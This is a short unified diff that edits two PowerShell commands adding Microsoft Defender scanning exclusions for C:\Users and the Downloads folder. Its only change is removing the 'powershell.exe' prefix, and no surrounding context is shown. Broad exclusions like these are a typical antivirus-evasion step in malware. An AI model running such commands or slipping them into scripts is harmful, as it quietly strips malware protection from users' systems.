@@ -1,2 +1,2 @@
-powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
-powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
+Add-MpPreference -ExclusionPath "C:\Users"
+Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
